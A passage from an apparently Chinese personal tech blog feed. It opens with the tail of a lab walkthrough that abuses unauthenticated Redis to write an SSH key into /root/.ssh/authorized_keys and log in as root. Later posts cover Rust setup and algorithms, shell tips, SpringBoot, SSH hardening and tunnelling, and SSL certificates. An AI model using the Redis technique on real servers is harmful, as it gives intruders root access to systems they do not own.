# redis-cli -h 192.168.211.92 192.168.211.92:6379&gt; get bar &#34;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDT7pRswOtbeoORgawZVEXI/PNHcLixhR0vo0+RavW8uZawKdaVGpBib84jhXy7IWz/vCDrCdZvDe46YlLGJq3ItNEV4ZwI6gjGQZCIFU5Bj0EVG33L5rhVx/Eqx1aXkdJJPBykUNTqLMqycD9Vwu83X1fo1pKLfrKCgJCJCtTj1vgIylYtFP9sDBaXG7y88HP3DuoXW84EJgEQpIAhHn0h79X5EC4i4ow7FvYHmEhDqc1ba/9CBIkHXQDnRWh2gftMhK0OkXc9+XJbj6SKZ/bg7Klwj6BVstd2xsKxcYNLNB9P3JGDjO57fAF/7JCqpt40hoRkBOnNji3f5zRuX4edFTBs9R7ifra+QdO/EJuxXL5h+laUzZbi+zBcnV9Ie+EU7q6Rp3+wo4RERh7rQJOHPn7Q+yJkj1dsSiYzkcGR3LJOjX7sKQS20R9p0YYSvn1Gi8DLEHuuyqFkjmWCqNxxzcXefDA509NxqewAe6s1UQMX9JWA/yb4O6mBKoFJfUs= root@fedora\n\n\n\n&#34; 192.168.211.92:6379&gt; 5. 通过Redis保存机制替换系统文件 192.168.211.92:6379&gt; config set dir /root/.ssh OK 192.168.211.92:6379&gt; config get dir 1) &#34;dir&#34; 2) &#34;/root/.ssh&#34; 192.168.211.92:6379&gt; config set dbfilename &#34;authorized_keys&#34; OK 192.168.211.92:6379&gt; save OK 192.168.211.92:6379&gt; exit 6. 登录远程主机 [root@fedora ~]# ssh root@192.168.211.92 Linux 102-debian 5.15.30-2-pve #1 SMP PVE 5.15.30-3 (Fri, 22 Apr 2022 18:08:27 +0200) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 16 07:45:36 2022 from 192.168.211.123 root@102-debian:~#   ]]></content></entry><entry><title>Rust的下载和安装</title><url>/posts/rust/rust%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85/</url><categories><category>Rust</category></categories><tags><tag>Rust</tag></tags><content type="html"><![CDATA[  下载 官网地址 下载地址 安装 windows 推荐使用WSL安装
Windows安装 安装器下载地址 https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-gnu/rustup-init.exe 工具链选择 x86_64-pc-windows-gnu 其它的默认就行 配置系统变量环境 CARGO_HOME	C:\Users\Colzry.cargo RUSTUP_HOME	C:\Users\Colzry.rustup 编辑PATH	%CARGO_HOME%\bin WSL安装
curl --proto &#39;=https&#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh # 使用代理进行安装 curl --proto &#39;=https&#39; --tlsv1.2 -sSf https://rsproxy.cn/rustup-init.sh | sh Linux 安装
curl https://sh.rustup.rs -sSf | sh Rust 代理 代理网站 Rustup Mirror vim $HOME/.cargo/env
########################### 字节镜像 ################################### export RUSTUP_DIST_SERVER=&#34;https://rsproxy.cn&#34; export RUSTUP_UPDATE_ROOT=&#34;https://rsproxy.cn/rustup&#34; ########################### 科大镜像 ################################### export RUSTUP_DIST_SERVER=&#34;https://mirrors.ustc.edu.cn/rust-static&#34; export RUSTUP_UPDATE_ROOT=&#34;https://mirrors.ustc.edu.cn/rust-static/rustup&#34; ########## Windows 下对应的设置环境变量的 PowerShell 命令为 ########### $env:RUSTUP_DIST_SERVER=&#34;https://mirrors.ustc.edu.cn/rust-static&#34; $env:RUSTUP_UPDATE_ROOT=&#34;https://mirrors.ustc.edu.cn/rust-static/rustup&#34; crates.io Mirror vim $HOME/.cargo/config
########################### 字节镜像 ################################### [source.crates-io] replace-with = &#39;rsproxy&#39; [source.rsproxy] registry = &#34;https://rsproxy.cn/crates.io-index&#34; [registries.rsproxy] index = &#34;https://rsproxy.cn/crates.io-index&#34; [net] git-fetch-with-cli = true ########################### 科大镜像 ################################### [source.crates-io] replace-with = &#39;ustc&#39; [source.ustc] registry = &#34;https://mirrors.ustc.edu.cn/crates.io-index&#34; crm Cargo镜像管理 不需要手动更改配置文件，使用命令行进行配置
官网：https://github.com/wtklbm/crm
# 安装 cargo install crm # 测试国内镜像速度 crm test # 切换最佳的镜像 crm best Rust圣经下载到本地阅读 git clone https://github.com/sunface/rust-course.git cd ./rust-course cargo install mdbook mdbook build cp ./assets/CNAME ./book/ cp ./assets/*.html ./book/ cp ./assets/sitemap.xml ./book/ mdbook serve   ]]></content></entry><entry><title>Rust枚举实现链表</title><url>/posts/rust/%E6%9E%9A%E4%B8%BE%E5%AE%9E%E7%8E%B0%E9%93%BE%E8%A1%A8/</url><categories><category>Rust</category></categories><tags><tag>Rust</tag></tags><content type="html"><![CDATA[  use crate::List::*; enum List { // Cons: 链表中包含有值的节点，节点是元组类型，第一个元素是节点的值，第二个元素是指向下一个节点的指针 Cons(u32, Box&lt;List&gt;), // Nil: 链表中的最后一个节点，用于说明链表的结束 Nil, } // 为枚举实现一些方法 impl List { // 创建空的链表 fn new() -&gt; List { // 因为没有节点，所以直接返回 Nil 节点 // 枚举成员 Nil 的类型是 List Nil } // 在老的链表前面新增一个节点，并返回新的链表 fn prepend(self, elem: u32) -&gt; List { // `Cons` also has type List Cons(elem, Box::new(self)) } // 返回链表的长度 fn len(&amp;self) -&gt; u32 { // `self` has to be matched, because the behavior of this method // depends on the variant of `self` // `self` has type `&amp;List`, and `*self` has type `List`, matching on a // concrete type `T` is preferred over a match on a reference `&amp;T` // after Rust 2018 you can use self here and tail (with no ref) below as well, // rust will infer &amp;s and ref tail. // See https://doc.rust-lang.org/edition-guide/rust-2018/ownership-and-lifetimes/default-match-bindings.html match *self { // Can&#39;t take ownership of the tail, because `self` is borrowed; // instead take a reference to the tail // 这里我们不能拿走 tail 的所有权，因此需要获取它的引用 Cons(_, ref tail) =&gt; 1 + tail.len(), // 空链表的长度为 0 Nil =&gt; 0 } } // 返回链表的字符串表现形式，用于打印输出 fn stringify(&amp;self) -&gt; String { match *self { Cons(head, ref tail) =&gt; { // `format!` is similar to `print!`, but returns a heap // allocated string instead of printing to the console // 递归生成字符串 format!(&#34;{}, {}&#34;, head, tail.stringify()) } Nil =&gt; { format!(&#34;Nil&#34;) } } } } fn main() { // 创建一个新的链表(也是空的) let mut list = List::new(); // 添加一些元素 list = list.prepend(1); list = list.prepend(2); list = list.prepend(3); // 打印列表的当前状态 println!(&#34;linked list has length: {}&#34;, list.len()); println!(&#34;{}&#34;, list.stringify()); }   ]]></content></entry><entry><title>Rust排序算法</title><url>/posts/rust/rust%E7%AE%97%E6%B3%95/</url><categories><category>Rust</category></categories><tags><tag>Rust</tag></tags><content type="html"><![CDATA[  1. 归并算法 [dependencies] rand = &#34;0.8.5&#34; stopwatch = &#34;0.0.7&#34; use rand::prelude::*; use stopwatch::Stopwatch; fn merge_sort(arr: &amp;mut [i32]) { if arr.len() &gt; 1 { let mid = arr.len() / 2; merge_sort(&amp;mut arr[..mid]); merge_sort(&amp;mut arr[mid..]); merge(arr, mid); } } fn merge(arr: &amp;mut [i32], mid: usize) { let left = arr[..mid].to_vec(); let right = arr[mid..].to_vec(); let mut l = 0; let mut r = 0; for data in arr { if r == right.len() || (l &lt; left.len() &amp;&amp; left[l] &lt; right[r]) { *data = left[l]; l += 1; } else { *data = right[r]; r += 1; } } } fn main() { // 创建计时器 let sw1 = Stopwatch::start_new(); // 创建随机数组 let mut rng = rand::thread_rng(); let mut nums: Vec&lt;i32&gt; = (1..100000).collect(); nums.shuffle(&amp;mut rng); println!(&#34;创建数据耗时 {}ms&#34;, sw1.elapsed_ms()); // 开始排序 let sw2 = Stopwatch::start_new(); merge_sort(&amp;mut nums); println!(&#34;排序耗时 {}ms&#34;, sw2.elapsed_ms()); } 2. 选择排序 struct Solution; impl Solution { pub fn select_sort(arr: &amp;mut Vec&lt;i32&gt;) { for i in 0..arr.len()-1 { let mut k = i; for j in i+1..arr.len() { if arr[j] &lt; arr[k] { k = j } } arr.swap(i, k); } } } fn main() { let mut arr = vec![27, 38, 13, 49, 76, 97, 65]; Solution::select_sort(&amp;mut arr); println!(&#34;arr = {:?}&#34;, arr); } 3. 冒泡排序 struct Solution; impl Solution { pub fn bubble_sort(arr: &amp;mut Vec&lt;i32&gt;) { for i in 0..arr.len() - 1 { let mut change = false; for j in 0..arr.len() - 1 - i { if arr[j] &gt; arr[j + 1] { arr.swap(j, j + 1); change = true; } } if !change {return;} } } } fn main() { let mut arr = vec![27, 38, 13, 49, 76, 97, 65]; Solution::bubble_sort(&amp;mut arr); println!(&#34;arr = {:?}&#34;, arr); } 4. 插入排序 struct Solution; impl Solution { pub fn insert_sort(arr: &amp;mut Vec&lt;i32&gt;) { for i in 1..arr.len() { let mut j = i; while j &gt; 0 { if arr[j] &lt; arr[j - 1] { arr.swap(j, j - 1); } j -= 1; } } } } fn main() { let mut arr = vec![27, 38, 13, 49, 76, 97, 65]; Solution::insert_sort(&amp;mut arr); println!(&#34;arr = {:?}&#34;, arr); }   ]]></content></entry><entry><title>Screen的使用</title><url>/posts/linux%E6%93%8D%E4%BD%9C/screen%E7%9A%84%E4%BD%BF%E7%94%A8/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"><![CDATA[  # 新建会话 screen -S &lt;session_name&gt; # 快捷键Ctrl + A + D 分离当前会话到后台，返回到用户终端 C-a + d # 查看建立的会话 screen -ls # 连接建立的会话 screen -r &lt;session_name&gt; # 杀死建立的会话 screen -XS &lt;session_name&gt; quit   ]]></content></entry><entry><title>Shell脚本常用配置</title><url>/posts/vim/shell/</url><categories><category>Vim</category></categories><tags><tag>Vim</tag><tag>Shell</tag></tags><content type="html"><![CDATA[  1. 颜色 RED=&#39;\033[31m&#39; GREEN=&#39;\033[32m&#39; YELLOW=&#39;\033[33m&#39; BLUE=&#39;\033[34m&#39; PLAIN=&#39;\033[0m&#39; BOLD=&#39;\033[1m&#39; SUCCESS=&#39;[\033[32mOK\033[0m]&#39; COMPLETE=&#39;[\033[32mDONE\033[0m]&#39; WARN=&#39;[\033[33mWARN\033[0m]&#39; ERROR=&#39;[\033[31mERROR\033[0m]&#39; WORKING=&#39;[\033[34m*\033[0m]&#39; echo -e &#34;\n $SUCCESS success&#34; echo -e &#34;\n $COMPLETE complete&#34; echo -e &#34;\n $WARN warn&#34; echo -e &#34;\n $ERROR error&#34; echo -e &#34;\n $WORKING working&#34; echo -e &#34;\n ${GREEN} green ${PLAIN}&#34; echo -e &#34;\n ${BOLD} bold&#34; 输出结果 2. sed https://www.cnblogs.com/maxincai/p/5146338.html $ cat test.ini [mysql] basedir= datadir= # colzry @ ThinkBooK in ~ [23:30:08] $ sed -ri &#34;s@(basedir=)@\/usr\/local\/bin@g&#34; ./test.ini # colzry @ ThinkBooK in ~ [23:30:12] $ cat test.ini [mysql] basedir=/usr/local/bin datadir= ## 定义目录和文件 RedHatRelease=/etc/redhat-release DebianVersion=/etc/debian_version ## 系统判定变量 function EnvJudgment() { ## 判定当前系统基于 Debian or RedHat if [ -s $RedHatRelease ]; then echo -e &#34;\n yum 系列\n&#34; elif [ -s $DebianVersion ]; then echo -e &#34;\n apt 系列\n&#34; else echo -e &#34;\n 无法判断当前运行环境，请先确认本脚本针对当前操作系统是否适配\n&#34; exit fi } ## 环境判定 function PermissionJudgment() { ## 权限判定 if [ $UID -ne 0 ]; then echo -e &#34;\n 权限不足，请使用 Root 用户\n&#34; exit fi }   ]]></content></entry><entry><title>SpeedTest测速</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/speedtest%E6%B5%8B%E9%80%9F/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>SpeedTest</tag></tags><content type="html"><![CDATA[  1. 安装脚本 curl -fsSL git.io/speedtest-cli.sh | sudo bash 下载不了可以新建
#!/usr/bin/env bash # # Copyright (c) 2020-2021 P3TERX &lt;https://p3terx.com&gt; # # This is free software, licensed under the MIT License. # See /LICENSE for more information. # # https://github.com/P3TERX/script # File name: speedtest-cli.sh # Description: Install Ookla Speedtest CLI # System Required: GNU/Linux # Version: 1.3 # set -o errexit set -o errtrace set -o pipefail Green_font_prefix=&#34;\033[32m&#34; Red_font_prefix=&#34;\033[31m&#34; Green_background_prefix=&#34;\033[42;37m&#34; Red_background_prefix=&#34;\033[41;37m&#34; Font_color_suffix=&#34;\033[0m&#34; INFO=&#34;[${Green_font_prefix}INFO${Font_color_suffix}]&#34; ERROR=&#34;[${Red_font_prefix}ERROR${Font_color_suffix}]&#34; PROJECT_NAME=&#39;Ookla Speedtest CLI&#39; BIN_DIR=&#39;/usr/local/bin&#39; BIN_NAME=&#39;speedtest&#39; BIN_FILE=&#34;${BIN_DIR}/${BIN_NAME}&#34; if [[ $(uname -s) != Linux ]]; then echo -e &#34;${ERROR} This operating system is not supported.&#34; exit 1 fi if [[ $(id -u) != 0 ]]; then echo -e &#34;${ERROR} This script must be run as root.&#34; exit 1 fi echo -e &#34;${INFO} Get CPU architecture ...&#34; if [[ $(command -v apk) ]]; then PKGT=&#39;(apk)&#39; OS_ARCH=$(apk --print-arch) elif [[ $(command -v dpkg) ]]; then PKGT=&#39;(dpkg)&#39; OS_ARCH=$(dpkg --print-architecture | awk -F- &#39;{ print $NF }&#39;) else OS_ARCH=$(uname -m) fi case ${OS_ARCH} in *86) FILE_KEYWORD=&#39;i386&#39; ;; x86_64 | amd64) FILE_KEYWORD=&#39;x86_64&#39; ;; aarch64 | arm64) FILE_KEYWORD=&#39;aarch64&#39; ;; arm*) FILE_KEYWORD=&#39;arm&#39; ;; *) echo -e &#34;${ERROR} Unsupported architecture: ${OS_ARCH} ${PKGT}&#34; exit 1 ;; esac echo -e &#34;${INFO} Architecture: ${OS_ARCH} ${PKGT}&#34; echo -e &#34;${INFO} Get ${PROJECT_NAME} download URL ...&#34; DOWNLOAD_URL=&#34;https://install.speedtest.net/app/cli/ookla-speedtest-1.0.0-${FILE_KEYWORD}-linux.tgz&#34; echo -e &#34;${INFO} Download URL: ${DOWNLOAD_URL}&#34; echo -e &#34;${INFO} Installing ${PROJECT_NAME} ...&#34; curl -LS &#34;${DOWNLOAD_URL}&#34; | tar xzC ${BIN_DIR} ${BIN_NAME} chmod +x ${BIN_FILE} if [[ ! $(echo ${PATH} | grep ${BIN_DIR}) ]]; then ln -sf ${BIN_FILE} /usr/bin/${BIN_NAME} fi if [[ -s ${BIN_FILE} &amp;&amp; $(${BIN_NAME} --version) ]]; then echo -e &#34;${INFO} Done.&#34; else echo -e &#34;${ERROR} ${PROJECT_NAME} installation failed !&#34; exit 1 fi 安装完成后执行
speedtest   ]]></content></entry><entry><title>SpringBoot AOP</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/springboot-aop/</url><categories><category>框架和中间件</category></categories><tags><tag>AOP</tag></tags><content type="html"><![CDATA[  1. 前言 aop面向切面编程，是编程中一个很重要的思想本篇文章主要介绍的是SpringBoot切面Aop的使用和案例
2. 什么是aop AOP（Aspect OrientedProgramming）：面向切面编程，面向切面编程（也叫面向方面编程），是目前软件开发中的一个热点，也是Spring框架中的一个重要内容。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。
3. 使用场景 利用AOP可以对我们边缘业务进行隔离，降低无关业务逻辑耦合性。提高程序的可重用性，同时提高了开发的效率。一般用于日志记录，性能统计，安全控制，权限管理，事务处理，异常处理，资源池管理。使用场景
4. 为什么需要面向切面编程 面向对象编程（OOP）的好处是显而易见的，缺点也同样明显。当需要为多个不具有继承关系的对象添加一个公共的方法的时候，例如日志记录、性能监控等，如果采用面向对象编程的方法，需要在每个对象里面都添加相同的方法，这样就产生了较大的重复工作量和大量的重复代码，不利于维护。面向切面编程（AOP）是面向对象编程的补充，简单来说就是统一处理某一“切面”的问题的编程思想。如果使用AOP的方式进行日志的记录和处理，所有的日志代码都集中于一处，不需要再每个方法里面都去添加，极大减少了重复代码。
5. 技术要点 通知（Advice）包含了需要用于多个应用对象的横切行为，完全听不懂，没关系，通俗一点说就是定义了“什么时候”和“做什么”。 连接点（Join Point）是程序执行过程中能够应用通知的所有点。 切点（Poincut）是定义了在“什么地方”进行切入，哪些连接点会得到通知。显然，切点一定是连接点。 切面（Aspect）是通知和切点的结合。通知和切点共同定义了切面的全部内容——是什么，何时，何地完成功能。 引入（Introduction）允许我们向现有的类中添加新方法或者属性。 织入（Weaving）是把切面应用到目标对象并创建新的代理对象的过程，分为编译期织入、类加载期织入和运行期织入。 6. 整合使用 6.1 导入依赖 在springboot中使用aop要导aop依赖
&amp;lt;!--aop 切面--&amp;gt; &amp;lt;dependency&amp;gt; …  ]]></content></entry><entry><title>SpringBoot整合Redis</title><url>/posts/redis/springboot%E6%95%B4%E5%90%88redis/</url><categories><category>Redis</category></categories><tags><tag>Redis</tag></tags><content type="html"><![CDATA[  pom.xml引入依赖 &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-data-redis&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; yml配置 # 服务器端口 server: port: 8848 # Spring Boot 的数据源配置 spring: redis: database: 0 host: localhost # Redis服务器地址 port: 6379 # Redis服务器连接端口 password: # Redis服务器连接密码（默认为空） pool: max-active: 200 # 连接池最大连接数（使用负值表示没有限制） max-idle: 10 # 连接池中的最大空闲连接 max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制） min-idle: 0 # 连接池中的最小空闲连接 timeout: 1000 # 连接超时时间（毫秒） datasource: url: jdbc:mysql://localhost:3306/use_redis?useUnicode=true&amp;amp;characterEncoding=UTF-8&amp;amp;useSSL=false&amp;amp;serverTimezone=Asia/Shanghai&amp;amp;allowPublicKeyRetrieval=true username: root password: root driver-class-name: com.mysql.jdbc.Driver # 使用druid数据源 type: com.alibaba.druid.pool.DruidDataSource mybatis-plus: # xml扫描，多个目录用逗号或者分号分隔（告诉 Mapper 所对应的 XML 文件位置） mapper-locations: classpath:mapper/*.xml global-config: #字段策略 0:&amp;#34;忽略判断&amp;#34;,1:&amp;#34;非 NULL 判断&amp;#34;),2:&amp;#34;非空判断&amp;#34; …  ]]></content></entry><entry><title>SpringSecurity入门</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/springsecurity/</url><categories><category>框架和中间件</category></categories><tags><tag>SpringSecurity</tag></tags><content type="html"><![CDATA[  1. 快速入门 1.1 创建工程 1.1.1 先创建父工程 1.1.2 将不需要的文件都删除 1.1.3 在该工程中新建Module 1.1.4 引入依赖 父模块依赖
&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;project xmlns=&amp;#34;http://maven.apache.org/POM/4.0.0&amp;#34; xmlns:xsi=&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34; xsi:schemaLocation=&amp;#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&amp;#34;&amp;gt; &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt; &amp;lt;parent&amp;gt; &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.3.7.RELEASE&amp;lt;/version&amp;gt; &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt; &amp;lt;/parent&amp;gt; &amp;lt;groupId&amp;gt;com.colzry&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;SpringBootDemo&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt; &amp;lt;packaging&amp;gt;pom&amp;lt;/packaging&amp;gt; &amp;lt;modules&amp;gt; &amp;lt;module&amp;gt;SecurityJWT&amp;lt;/module&amp;gt; &amp;lt;module&amp;gt;AOPDemo&amp;lt;/module&amp;gt; &amp;lt;/modules&amp;gt; &amp;lt;properties&amp;gt; …  ]]></content></entry><entry><title>SSH防暴力破解</title><url>/posts/ssh/ssh%E9%98%B2%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url><categories><category>SSH</category></categories><tags><tag>SSH</tag></tags><content type="html"><![CDATA[  1. 添加登录试错次数 vim /etc/pam.d/sshd # 在末尾添加以下内容 auth required pam_tally2.so deny=3 unlock_time=60 even_deny_root root_unlock_time=60 # 解释 even_deny_root 也限制root用户； deny 设置普通用户和root用户连续错误登陆的最大次数，超过最大次数，则锁定该用户 unlock_time 设定普通用户锁定后，多少时间后解锁，单位是秒； root_unlock_time 设定root用户锁定后，多少时间后解锁，单位是秒； 解除锁定方法
# 在服务器端以root用户执行命令, 清空指定用户的错误登录次数 pam_tally2 -u root -r # 或者 pam_tally2 --user 用户名 --reset 2. 防火墙拉黑攻击IP 查看登录的IP
# 查看登入成功的用户日志 last -f /var/run/utmp # 查看登入失败的用户日志 last -f /var/log/btmp 使用防火墙封禁IP
# 单个IP firewall-cmd --permanent --add-rich-rule=&#34;rule family=&#39;ipv4&#39; source address=&#39;46.216.73.28&#39; reject&#34; # IP段 firewall-cmd --permanent --add-rich-rule=&#34;rule family=&#39;ipv4&#39; source address=&#39;46.216.73.0/24&#39; reject&#34; # 单个IP的某个端口 firewall-cmd --permanent --add-rich-rule=&#34;rule family=ipv4 source address=46.216.73.28 port port=80 protocol=tcp reject&#34; # reject 拒绝 accept 允许 重新载入以生效
firewall-cmd --reload 查看封禁IP
firewall-cmd --list-rich-rules   ]]></content></entry><entry><title>SSH免密登录</title><url>/posts/ssh/ssh-%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url><categories><category>SSH</category></categories><tags><tag>SSH</tag></tags><content type="html"> 安装 # 安装服务端/客户端(Ubuntu) $ sudo apt install openssh-server/openssh-client # 查看ssh服务是否开启 $ netstat -tlp | grep ssh # 启动/停止/重启 ssh服务 $ sudo /etc/init.d/ssh start/stop/restart ssh服务端配置文件默认为/etc/ssh/sshd_config。可以按需修改默认22端口等配置。 普通登录方式 # 命令格式 $ ssh [-options] [user@hostname] options 含义 -p 指定ssh端口号,默认端口为22 -i 使用指定私钥文件连接服务器( 免密登录 ) user远程服务器登录的用户名，默认为当前用户 hostname远程服务器地址。可以是IP/域名/别名 exit或logout命令均可退出当前登录 # 以hadoop用户登录192.168.1.196的到ssh服务器 $ ssh hadoop@192.168.1.196 # 以hadoop户登录到192.168.1.198的ssh服务器，使用8022端口 $ ssh hadoop@192.168.1.198 -p 8022 ssh高级配置 ssh配置信息都保存在~/.ssh 中
配置文件 作用 known_hosts 作为客户端。记录曾连接服务器授权。ssh第一次连接一台服务器会有一个授权提示，确认授权后会记录在此文件中，下次连接记录中的服务器时则不再需要进行授权确认提示 authorized_keys 作为服务端。客户端的免密连接公钥文件 config 作为客户端。记录连接服务器配置的别名 服务器别名 远程管理命令(如ssh,scp等)连接一台服务器时一般都需要提供 服务器地址、端口、用户名 ，每次输入比较繁琐，我们可以把经常使用的服务器连接参数打包记录到配置文件中并为其设置一个简单易记的别名。这样我们就可以通过别名方便的访问服务器，而不需要提供地址、端口、用户名等信息了。
配置方法如下：
创建或打开 ~/.ssh/config，在文件追加服务器配置信息 一台服务器配置格式如下 Host 【别名】 HostName 192.168.1.196 User hadoop Port 22 免密登录 远程管理命令(如ssh,scp等) …</content></entry><entry><title>SSH隧道</title><url>/posts/ssh/ssh%E9%9A%A7%E9%81%93/</url><categories><category>SSH</category></categories><tags><tag>隧道</tag></tags><content type="html"> 先总结 如果源地址是 ssh client 的某个端口，称为本地转发（Local Port Forwarding），发往 ssh client 指定端口的数据包会经过 ssh server 进行转发； 如果源地址是 ssh server 的某个端口，则称为远程转发（Remote Port Forwarding），发往 ssh server 指定端口的数据包会经过 ssh client 进行转发. # 注意：命令都是在本地client上运行 # 本地端口转发 # 访问本地端口即访问目标端口 ssh -L [本地ip]:本地端口:远程ip:远程端口 user@server_ip # 远程端口转发 # 访问远程端口即访问目标端口 ssh -R [远程ip]:远程端口:本地ip:本地端口 user@server_ip 注意 1. 使用ssh前先修改配置文件
2. 远程转发本地的地址填localhost不要填127.0.0.1
命令大纲 假设存在三个设备
laptop 笔记本 laptop_app 与笔记本同内网的设备（远程服务器不能连接）ip: 172.14.17.28 server 远程服务器 ip: 47.28.101.27 server_app 与远程服务器同内网的设备（笔记本不能连接）ip: 172.22.89.30 以下命令都在笔记本终端上运行
# 本地端口转发 (访问本地端口即访问目标`server_app`上的端口) ssh -N -g -f -L 8080:172.22.89.30:80 root@47.28.101.27 -N 只进行ssh隧道转发，不连接ssh -g 表示源ip为0.0.0.0 -f 后台运行 # 远程端口转发 (访问远程端口即访问目标`laptop_app`上的端口) ssh -N -g -f -R 80:172.14.17.28:3000 root@47.28.101.27 # 动态转发 ssh -N -g -f -D 1080 root@47.28.101.27 得到socks5代理服务 1. 本地端口转发 绿色代表能访问，红色代表不能访问 ssh -N -g -f -L 8080:172.22.89.30:80 root@47.28.101.27 # frp实战（即访问本地8080端口等价访问目标80端口） ssh -N -g -L 8080:127.0.0.1:80 root@cn-hz-bgp-1.openfrp.top -p 43252 访问本机主机的8080端口即访问目标主机的80端口服务
2. 远程端口转发 ssh -N -g -f -R 80:172.14.17.28:3000 root@47.28.101.27 # 腾讯云实战（访问http://43.142.174.216:5200/ 即访问目标的 5212端口上的服务） ssh -N -g -R 5200:192.168.5.58:5212 colzry@43.142.174.216 访问远程主机的端口即访问目标主机的端口服务 常用于将内部的服务让其他用户访问
关闭服务
ps -ef | grep ssh kill -9 PID 3. 动态端口转发 相当于代理服务器，即科学上网的节点
ssh -N -g -f -D 1080 root@47.28.101.27 socks5://127.0.0.1:1080 使用示例：linux-debian系列
sudo apt-get install proxychains -y vim /etc/proxychains.conf # 尾部加上 socks5 127.0.0.1 1080 # 在需要使用代理命令前使用 proxychains git clone https://github.com/xxx/xxx</content></entry><entry><title>SSL证书申请</title><url>/posts/nginx/ssl%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/</url><categories><category>Nginx</category></categories><tags><tag>Nginx</tag></tags><content type="html"> 1. Acme 脚本申请证书 Acme 脚本申请证书，是我们用到的最常见的一种证书的申请方式，它有很多的申请方法，大家只需要找到一种适合自己的也就好了。
不管用下面的何种方式申请，都需要安装 Acme，有一部分的申请场景需要用到相关的插件，所以我们需要提前安装。 下面环境的安装方式，大家根据自己的系统选择命令安装就好了。
apt update -y #Debian/Ubuntu 命令 apt install -y curl #Debian/Ubuntu 命令 apt install -y socat #Debian/Ubuntu 命令 yum update -y #CentOS 命令 yum install -y curl #CentOS 命令 yum install -y socat #CentOS 命令 # 关闭防火墙 systemctl disable firewalld.service systemctl stop firewalld.service 安装 Acme 脚本
curl https://get.acme.sh | sh 更换Acme的默认CA颁发机构
~/.acme.sh/acme.sh --set-default-ca --server letsencrypt 2. 申请时请先解析域名 2.1 80 端口空闲的验证申请(到此可以结束) 如果你还没有运行任何 web 服务, 80 端口是空闲的, 那么 Acme.sh 还能假装自己是一个 WebServer, 临时监听在 80 端口, 完成验证
~/.acme.sh/acme.sh --issue -d 填入你的域名 --standalone 2.2 指定空闲端口申请 如果80端口用不了，可以指定其他的端口
~/.acme.sh/acme.sh --issue -d 填入你的域名 --standalone --httpport 88 2.3 Nginx 的方式验证申请 这种方式需要你的服务器上面已经部署了 Nginx 环境，并且保证你申请的域名已经在 Nginx 进行了 conf 部署。（被申请的域名可以正常被打开）
~/.acme.sh/acme.sh --issue -d 填入你的域名 --nginx 2.4 http 的方式验证申请 这种方式需要你的服务器上面已经部署了网站环境。（被申请的域名可以正常被打开） 原理：Acme 自动在你的网站根目录下放置一个文件, （这个文件可以被互联网访问）来验证你的域名所有权,完成验证. 然后就可以生成证书了. 实例代码：（后面的路径请更改为你的 网站根目录 绝对路径 ）
~/.acme.sh/acme.sh --issue -d 填入你的域名 --webroot /home/wwwroot/网站目录/ 2.5 安装证书到指定文件夹 注意, 默认生成的证书都放在安装目录下: ~/.acme.sh/, 请不要直接使用此目录下的证书文件。 正确的使用方法是使用 --install-cert 命令,并指定目标位置, 然后证书文件会被copy到相应的位置，比如下面的代码
~/.acme.sh/acme.sh --installcert -d 填入你的域名 --key-file /root/private.key --fullchain-file /root/cert.crt 上面的 /root/private.key 以及 /root/cert.crt 是把密钥和证书安装到 /root 目录，并改名为 private.key 和 cert.crt
2.6 更新证书 目前证书在 60 天以后会自动更新, 你无需任何操作. 今后有可能会缩短这个时间, 不过都是自动的, 你不用关心.
2.6.1 查看更新证书列表 /root/.acme.sh/acme.sh --list 2.6.2 手动更新所有证书 /root/.acme.sh/acme.sh --renew-all 2.6.3 手动更新指定证书 /root/.acme.sh/acme.sh --renew -d 域名 2.6.4 停止自动更新 /root/.acme.sh/acme.sh --remove -d 要停止的域名 2.7 更新 Acme 脚本 升级 Acme.sh 到最新版本
~/.acme.sh/acme.sh --upgrade 如果你不想手动升级, 可以开启自动升级:
